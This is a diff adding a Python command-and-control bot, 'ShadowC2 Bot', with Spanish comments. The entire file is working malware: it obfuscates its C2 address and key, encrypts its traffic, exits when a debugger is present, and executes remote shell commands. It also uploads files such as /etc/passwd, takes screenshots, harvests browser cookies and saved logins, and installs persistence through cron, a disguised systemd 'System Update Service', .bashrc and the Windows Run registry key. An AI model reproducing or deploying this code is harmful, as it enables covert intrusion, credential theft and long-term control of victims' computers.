@@ -1,0 +1,501 @@
+#!/usr/bin/env python3
+"""
+ShadowC2 Bot - Modo STEALTH (corregido)
+"""
+
+import base64
+import hashlib
+import json
+import os
+import platform
+import random
+import socket
+import sqlite3
+import string
+import subprocess
+import sys
+import time
+import uuid
+import zlib
+from datetime import datetime
+from pathlib import Path
+
+import psutil
+import requests
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from PIL import ImageGrab
+
+# CONFIGURACION
+_C2_HOST = "bG9jYWxob3N0OjgwMDA="
+_PASSPHRASE = "".join([chr(x) for x in [83, 104, 97, 100, 111, 119, 67, 50, 95, 76, 97, 98, 95, 50, 48, 50, 54, 95, 83, 101, 99, 114, 101, 116, 95, 75, 101, 121]])
+
+def _d(s): 
+    return base64.b64decode(s).decode()
+
+def _derive_key(passphrase, salt=None):
+    if salt is None:
+        salt = os.urandom(16)
+    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
+    key = base64.urlsafe_b64encode(kdf.derive(passphrase.encode()))
+    return key, salt
+
+def _enc(data):
+    key, salt = _derive_key(_PASSPHRASE)
+    f = Fernet(key)
+    encrypted = f.encrypt(data.encode())
+    return base64.urlsafe_b64encode(salt + encrypted).decode()
+
+def _dec(token):
+    try:
+        decoded = base64.urlsafe_b64decode(token.encode())
+        salt, encrypted = decoded[:16], decoded[16:]
+        key, _ = _derive_key(_PASSPHRASE, salt)
+        f = Fernet(key)
+        return f.decrypt(encrypted).decode()
+    except Exception as e:
+        print(f"[DEBUG _dec error] {e}")
+        return None
+
+def _poly_encode(data):
+    layers = ['base64', 'hex', 'reverse']
+    random.shuffle(layers)
+    result = data
+    for layer in layers:
+        if layer == 'base64':
+            result = base64.b64encode(result.encode()).decode()
+        elif layer == 'hex':
+            result = result.encode().hex()
+        elif layer == 'reverse':
+            result = result[::-1]
+    return base64.b64encode(f"{','.join(layers)}:{result}".encode()).decode()
+
+def _poly_decode(data):
+    try:
+        decoded = base64.b64decode(data).decode()
+        metadata, content = decoded.split(':', 1)
+        layers = metadata.split(',')
+        for layer in reversed(layers):
+            if layer == 'base64':
+                content = base64.b64decode(content).decode()
+            elif layer == 'hex':
+                content = bytes.fromhex(content).decode()
+            elif layer == 'reverse':
+                content = content[::-1]
+        return content
+    except Exception as e:
+        print(f"[DEBUG _poly_decode error] {e}")
+        return None
+
+def _compress_and_encrypt(data):
+    compressed = zlib.compress(data.encode())
+    return _enc(base64.b64encode(compressed).decode())
+
+def _decrypt_and_decompress(data):
+    decrypted = _dec(data)
+    if decrypted:
+        try:
+            compressed = base64.b64decode(decrypted)
+            return zlib.decompress(compressed).decode()
+        except Exception as e:
+            print(f"[DEBUG decompress error] {e}")
+            return None
+    return None
+
+def _decrypt_command(encrypted):
+    """Igual que decrypt_command en crypto.py del C2"""
+    poly = _dec(encrypted)
+    if poly:
+        json_data = _poly_decode(poly)
+        if json_data:
+            try:
+                return json.loads(json_data)
+            except:
+                return None
+    return None
+
+class BotStealth:
+    def __init__(self):
+        self.bot_id = "".join(random.choices("abcdef0123456789", k=8))
+        self.hostname = socket.gethostname()
+        self.username = os.getlogin() if hasattr(os, 'getlogin') else 'unknown'
+        self.os_info = f"{platform.system()} {platform.release()}"
+        self.c2_url = f"http://{_d(_C2_HOST)}"
+        self._j = lambda d: json.dumps(d)
+        self._l = lambda s: json.loads(s)
+        self.keylogger_active = False
+        self.keylog_buffer = []
+        self._anti_analysis()
+    
+    def _anti_analysis(self):
+        time.sleep(random.uniform(2, 5))
+        if sys.gettrace() is not None:
+            sys.exit(0)
+        try:
+            with open('/proc/cpuinfo', 'r') as f:
+                if 'hypervisor' in f.read().lower():
+                    pass
+        except:
+            pass
+    
+    def _random_ua(self):
+        uas = [
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.0",
+            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
+        ]
+        return random.choice(uas)
+    
+    def _post(self, endpoint, data):
+        try:
+            encrypted = _compress_and_encrypt(data)
+            r = requests.post(
+                f"{self.c2_url}{endpoint}",
+                json={"data": encrypted},
+                timeout=random.uniform(8, 15),
+                headers={
+                    "User-Agent": self._random_ua(),
+                    "Accept": "application/json",
+                    "Content-Type": "application/json"
+                }
+            )
+            if r.status_code == 200:
+                resp_data = r.json().get("data")
+                if resp_data:
+                    return _decrypt_and_decompress(resp_data)
+            return None
+        except Exception as e:
+            print(f"[DEBUG _post error] {e}")
+            return None
+    
+    def _get(self, endpoint):
+        try:
+            r = requests.get(
+                f"{self.c2_url}{endpoint}",
+                timeout=random.uniform(8, 15),
+                headers={
+                    "User-Agent": self._random_ua(),
+                    "Accept": "application/json"
+                }
+            )
+            if r.status_code == 200:
+                resp_data = r.json().get("data")
+                if resp_data:
+                    return _decrypt_and_decompress(resp_data)
+            return None
+        except Exception as e:
+            print(f"[DEBUG _get error] {e}")
+            return None
+    
+    def register(self):
+        data = self._j({
+            "bot_id": self.bot_id,
+            "hostname": self.hostname,
+            "username": self.username,
+            "os": self.os_info,
+            "capabilities": ["shell", "screenshot", "keylog", "download", "upload", 
+                           "persist", "info", "cookies", "passwords", "processes"]
+        })
+        result = self._post(f"/c2/stealth/register", data)
+        if result:
+            parsed = self._l(result)
+            self.bot_id = parsed.get("bot_id", self.bot_id)
+            return True
+        return False
+    
+    def check_commands(self):
+        result = self._get(f"/c2/stealth/check/{self.bot_id}")
+        print(f"[DEBUG check_commands] result: {result}")
+        if result:
+            parsed = self._l(result)
+            commands = []
+            for enc_cmd in parsed.get("commands", []):
+                print(f"[DEBUG] Encrypted command: {enc_cmd[:80]}...")
+                cmd = _decrypt_command(enc_cmd)
+                if cmd:
+                    print(f"[DEBUG] Decrypted command: {cmd}")
+                    commands.append(cmd)
+                else:
+                    print(f"[DEBUG] Failed to decrypt command")
+            return commands
+        return []
+    
+    def send_result(self, cmd_id, result):
+        data = self._j({"cmd_id": cmd_id, "result": result})
+        self._post(f"/c2/stealth/result/{self.bot_id}", data)
+    
+    def execute_shell(self, command):
+        try:
+            result = subprocess.run(command, shell=True, capture_output=True, 
+                                  text=True, timeout=30)
+            return {"stdout": result.stdout, "stderr": result.stderr, 
+                   "returncode": result.returncode}
+        except Exception as e:
+            return {"error": str(e)}
+    
+    def take_screenshot(self):
+        try:
+            import io
+            screenshot = ImageGrab.grab()
+            buf = io.BytesIO()
+            screenshot.save(buf, format='PNG')
+            img_data = base64.b64encode(buf.getvalue()).decode()
+            
+            data = self._j({"image_data": img_data})
+            self._post(f"/c2/stealth/screenshot/{self.bot_id}", data)
+            return {"status": "screenshot enviado"}
+        except Exception as e:
+            return {"error": str(e)}
+    
+    def get_system_info(self):
+        return {
+            "cpu_count": os.cpu_count(),
+            "memory_total": psutil.virtual_memory().total,
+            "memory_used": psutil.virtual_memory().used,
+            "disk_usage": dict(psutil.disk_usage('/')._asdict()),
+            "cwd": os.getcwd(),
+            "pid": os.getpid(),
+            "network_interfaces": psutil.net_if_addrs(),
+            "boot_time": psutil.boot_time(),
+            "users": [u._asdict() for u in psutil.users()]
+        }
+    
+    def get_processes(self):
+        processes = []
+        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent']):
+            try:
+                processes.append(proc.info)
+            except:
+                pass
+        return {"processes": processes[:100]}
+    
+    def download_file(self, filepath):
+        try:
+            if not os.path.exists(filepath):
+                return {"error": "Archivo no encontrado"}
+            
+            filename = os.path.basename(filepath)
+            with open(filepath, 'rb') as f:
+                file_data = base64.b64encode(f.read()).decode()
+            
+            data = self._j({
+                "filename": filename,
+                "original_path": filepath,
+                "file_data": file_data
+            })
+            self._post(f"/c2/stealth/file/{self.bot_id}", data)
+            return {"status": "archivo subido", "filename": filename}
+        except Exception as e:
+            return {"error": str(e)}
+    
+    def establish_persistence(self):
+        try:
+            system = platform.system()
+            methods = []
+            
+            if system == "Linux":
+                try:
+                    cron = f"(crontab -l 2>/dev/null; echo '@reboot python3 {os.path.abspath(__file__)}') | crontab -"
+                    subprocess.run(cron, shell=True, check=False)
+                    methods.append("cron")
+                except:
+                    pass
+                
+                try:
+                    systemd_dir = Path.home() / ".config" / "systemd" / "user"
+                    systemd_dir.mkdir(parents=True, exist_ok=True)
+                    service_content = f"""[Unit]
+Description=System Update Service
+After=network.target
+[Service]
+Type=simple
+ExecStart=/usr/bin/python3 {os.path.abspath(__file__)}
+Restart=always
+[Install]
+WantedBy=default.target
+"""
+                    (systemd_dir / "update.service").write_text(service_content)
+                    subprocess.run("systemctl --user daemon-reload", shell=True, check=False)
+                    subprocess.run("systemctl --user enable update.service", shell=True, check=False)
+                    methods.append("systemd")
+                except:
+                    pass
+                
+                try:
+                    bashrc = Path.home() / ".bashrc"
+                    with open(bashrc, 'a') as f:
+                        f.write(f"\npython3 {os.path.abspath(__file__)} &>/dev/null &\n")
+                    methods.append("bashrc")
+                except:
+                    pass
+                
+                return {"method": "multi", "status": "persistencia establecida", "methods": methods}
+            
+            elif system == "Windows":
+                import winreg
+                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                                   r"Software\Microsoft\Windows\CurrentVersion\Run",
+                                   0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, "ShadowUpdate", 0, winreg.REG_SZ, 
+                                sys.executable + " " + os.path.abspath(__file__))
+                winreg.CloseKey(key)
+                return {"method": "registry", "status": "persistencia establecida"}
+            
+            return {"error": "OS no soportado"}
+        except Exception as e:
+            return {"error": str(e)}
+    
+    def extract_cookies(self):
+        cookies = {}
+        home = Path.home()
+        
+        chrome_paths = [
+            home / ".config" / "google-chrome" / "Default" / "Cookies",
+            home / ".config" / "chromium" / "Default" / "Cookies",
+            home / ".config" / "BraveSoftware" / "Brave-Browser" / "Default" / "Cookies",
+        ]
+        
+        for path in chrome_paths:
+            if path.exists():
+                try:
+                    conn = sqlite3.connect(str(path))
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT host_key, name, value, path FROM cookies")
+                    browser_name = path.parts[-3]
+                    cookies[browser_name] = [
+                        {"host": row[0], "name": row[1], "value": row[2][:50], "path": row[3]}
+                        for row in cursor.fetchall()[:20]
+                    ]
+                    conn.close()
+                except Exception as e:
+                    cookies[str(path)] = f"Error: {e}"
+        
+        firefox_path = home / ".mozilla" / "firefox"
+        if firefox_path.exists():
+            for profile in firefox_path.iterdir():
+                if profile.is_dir() and profile.name.endswith(".default"):
+                    cookies_file = profile / "cookies.sqlite"
+                    if cookies_file.exists():
+                        try:
+                            conn = sqlite3.connect(str(cookies_file))
+                            cursor = conn.cursor()
+                            cursor.execute("SELECT host, name, value, path FROM moz_cookies")
+                            cookies["firefox"] = [
+                                {"host": row[0], "name": row[1], "value": row[2][:50], "path": row[3]}
+                                for row in cursor.fetchall()[:20]
+                            ]
+                            conn.close()
+                        except Exception as e:
+                            cookies["firefox"] = f"Error: {e}"
+        
+        return {"cookies_found": len(cookies), "browsers": cookies}
+    
+    def extract_passwords(self):
+        passwords = {}
+        home = Path.home()
+        
+        chrome_login_paths = [
+            home / ".config" / "google-chrome" / "Default" / "Login Data",
+            home / ".config" / "chromium" / "Default" / "Login Data",
+        ]
+        
+        for path in chrome_paths:
+            if path.exists():
+                try:
+                    conn = sqlite3.connect(str(path))
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+                    browser_name = path.parts[-3]
+                    passwords[browser_name] = [
+                        {"url": row[0], "username": row[1], "password": "[ENCRYPTED]"}
+                        for row in cursor.fetchall()[:10]
+                    ]
+                    conn.close()
+                except Exception as e:
+                    passwords[str(path)] = f"Error: {e}"
+        
+        firefox_path = home / ".mozilla" / "firefox"
+        if firefox_path.exists():
+            for profile in firefox_path.iterdir():
+                if profile.is_dir() and profile.name.endswith(".default"):
+                    logins_file = profile / "logins.json"
+                    if logins_file.exists():
+                        try:
+                            data = json.loads(logins_file.read_text())
+                            passwords["firefox"] = [
+                                {"url": login.get("hostname", ""), 
+                                 "username": login.get("encryptedUsername", "")[:30]}
+                                for login in data.get("logins", [])[:10]
+                            ]
+                        except Exception as e:
+                            passwords["firefox"] = f"Error: {e}"
+        
+        return {"passwords_found": sum(len(v) for v in passwords.values() if isinstance(v, list)), 
+                "browsers": passwords}
+    
+    def run(self):
+        if not self.register():
+            print("[!] Error: No se pudo registrar con el C2")
+            print(f"[!] URL del C2: {self.c2_url}")
+            return
+        
+        print(f"[+] Bot registrado con ID: {self.bot_id}")
+        print(f"[+] Conectado a: {self.c2_url}")
+        
+        while True:
+            try:
+                commands = self.check_commands()
+                
+                for cmd in commands:
+                    print(f"[+] Ejecutando comando: {cmd}")
+                    command = cmd.get("command")
+                    args = cmd.get("args", [])
+                    cmd_id = cmd.get("cmd_id")
+                    
+                    if command == "shell":
+                        result = self.execute_shell(" ".join(args) if args else "whoami")
+                    elif command == "screenshot":
+                        result = self.take_screenshot()
+                    elif command == "info":
+                        result = self.get_system_info()
+                    elif command == "processes":
+                        result = self.get_processes()
+                    elif command == "download":
+                        result = self.download_file(args[0] if args else "/etc/passwd")
+                    elif command == "persist":
+                        result = self.establish_persistence()
+                    elif command == "cookies":
+                        result = self.extract_cookies()
+                    elif command == "passwords":
+                        result = self.extract_passwords()
+                    elif command == "keylog_start":
+                        self.keylogger_active = True
+                        result = {"status": "keylogger iniciado"}
+                    elif command == "keylog_stop":
+                        self.keylogger_active = False
+                        result = {"status": "keylogger detenido", "buffer": self.keylog_buffer}
+                        self.keylog_buffer = []
+                    elif command == "kill":
+                        self.send_result(cmd_id, {"status": "killed"})
+                        sys.exit(0)
+                    else:
+                        result = {"error": "Comando desconocido"}
+                    
+                    print(f"[+] Resultado: {result}")
+                    self.send_result(cmd_id, result)
+                
+                time.sleep(random.uniform(8, 15))
+                
+            except KeyboardInterrupt:
+                print("\n[!] Bot detenido por usuario")
+                break
+            except Exception as e:
+                print(f"[!] Error en loop: {e}")
+                import traceback
+                traceback.print_exc()
+                time.sleep(random.uniform(8, 15))
+
+if __name__ == "__main__":
+    bot = BotStealth()
+    bot.run()
